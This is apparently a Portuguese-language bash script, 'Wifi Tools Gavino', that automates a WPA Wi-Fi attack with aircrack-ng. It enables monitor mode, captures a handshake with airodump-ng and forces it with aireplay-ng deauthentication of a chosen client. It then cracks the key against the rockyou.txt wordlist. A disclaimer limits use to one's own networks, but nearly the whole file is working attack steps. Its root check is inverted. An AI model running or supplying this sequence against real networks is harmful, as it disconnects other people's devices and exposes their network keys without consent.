#!/bin/bash

set -e

# 🚨 Banner + aviso legal
clear
echo -e "\e[1;31m"
echo "██     ██ ██ ████████ ██ ████████  ██████   ██████  ██      "
echo "██     ██ ██    ██    ██    ██    ██    ██ ██    ██ ██      "
echo "██  █  ██ ██    ██    ██    ██    ██    ██ ██    ██ ██      "
echo "██ ███ ██ ██    ██    ██    ██    ██    ██ ██    ██ ██      "
echo " ███ ███  ██    ██    ██    ██     ██████   ██████  ███████ "
echo "                      W I F I   T O O L S   G A V I N O     "
echo -e "\e[0m"
echo -e "💻 Feito por Vasco Gavino (@vascogavino)"
echo -e "⚠️  Esta ferramenta é apenas para fins educativos e de teste em redes que te pertençam."
echo -e "❌ É ILEGAL usar isto contra redes de terceiros sem autorização explícita."
echo -e "🛑 O autor não se responsabiliza por qualquer uso indevido desta ferramenta."
echo -e "📜 Ao usares este script, assumes total responsabilidade pelas tuas ações."
echo -e "──────────────────────────────────────────────────────────────"
echo -e ""

if ! [[ "$EUID" -ne 0 ]]; then
    echo "Corre sem root, car*lho!"
    exit 1
fi

# Tentar instalar o aircrack-ng
if ! yay -S --noconfirm aircrack-ng; then
    echo -e "\n❌ Não conseguimos instalar o pacote 'aircrack-ng' com yay no teu sistema operativo."
    echo "Instala-o manualmente (ex: sudo pacman -S aircrack-ng ou outro método) e depois volta a correr o script."
    read -p "Carrega ENTER para fechar..."
    exit 1
fi

clear

# Mostrar interfaces de rede
echo -e "Interfaces disponíveis:\n"
ip a | grep -E "^[0-9]+:|inet "

read -p "Escreve o nome da tua placa Wi-Fi (ex: wlan0): " IFACE

# Colocar em modo monitor
sudo airmon-ng start "$IFACE"
IFACE_MON="${IFACE}mon"
clear
echo -e "\n✅ Modo monitor ativado em $IFACE_MON"

echo -e "\n=== 1️⃣ Abre um novo terminal e corre: ===\n"
echo "sudo airodump-ng $IFACE_MON"
read -p "Quando souberes o BSSID e canal (CH) da rede que pretendes testar, carrega ENTER..."

read -p "Insere o BSSID da rede alvo: " BSSID
read -p "Insere o canal (CH) da rede: " CHANNEL
read -p "Nome do ficheiro para guardar handshake (sem extensão): " HANDSHAKE_FILE

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
HANDSHAKE_FILE="$SCRIPT_DIR/$HANDSHAKE_FILE"

clear
echo -e "\n[DEBUG] Script está em: $SCRIPT_DIR"
echo "[DEBUG] HANDSHAKE_FILE: $HANDSHAKE_FILE"

echo -e "\n=== 2️⃣ Dá ctrl + c no terminal que tinhas aberto e corre: ===\n"
echo "sudo airodump-ng -d $BSSID -w \"$HANDSHAKE_FILE\" -c $CHANNEL $IFACE_MON"

read -p "Escolhe um dispositivo e insere o STATION dele: " STATION
clear
echo -e "\n=== 2️⃣ Abre outro terminal e corre: ==="
echo "sudo aireplay-ng -0 10 -a $BSSID -c $STATION $IFACE_MON"

read -p "Depois no terminal anterior deve aparecer 'WPA handshake' no topo. Se não aparecer, dá o comando outra vez ou tenta o STATION de outro dispositivo. Quando tiveres a certeza que apareceu, carrega ENTER..."

read -p "Insere o caminho para a wordlist (Se quiseres usar a que disponibilizamos mete isto: rockyou.txt): " WORDLIST
read -p "Nome do ficheiro .cap (deve ser este: $(basename "$HANDSHAKE_FILE")-01.cap a menos que tenhas outro): " CAP_FILE

CAP_FILE="$SCRIPT_DIR/$CAP_FILE"

echo -e "\n[DEBUG] Ficheiro .cap completo: $CAP_FILE"

echo -e "\n⏳ A tentar crackar o handshake..."
aircrack-ng -w "$WORDLIST" "$CAP_FILE"

echo -e "\n🔁 A voltar ao modo normal..."
sudo airmon-ng stop "$IFACE_MON"
sudo systemctl restart NetworkManager

echo -e "\n✅ Script terminado. Acima tens a chave ou não encontrou, boa sorte nas próximas tentativas!\n"
